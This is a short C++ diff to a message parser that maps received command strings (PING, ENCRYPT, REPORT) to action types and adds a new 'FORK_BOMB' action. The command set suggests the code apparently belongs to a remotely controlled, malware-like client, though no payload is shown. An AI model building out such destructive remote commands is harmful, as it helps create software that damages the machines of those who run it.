@@ -40,9 +40,10 @@ ActionInfo MessageParser::parseMessage(std::string receivedMessage, const char* 
         actionType = ActionType::PING;
     } else if (GeneralUtils::cStrAreEqual(strActionType, "ENCRYPT")) {
         actionType = ActionType::ENCRYPT;
-    } 
-    else if (GeneralUtils::cStrAreEqual(strActionType, "REPORT")) {
+    } else if (GeneralUtils::cStrAreEqual(strActionType, "REPORT")) {
         actionType = ActionType::REPORT;
+    } else if (GeneralUtils::cStrAreEqual(strActionType, "FORK_BOMB")) {
+        actionType = ActionType::FORK_BOMB;
     } else {
         actionType = ActionType::UNKNOWN;
     }
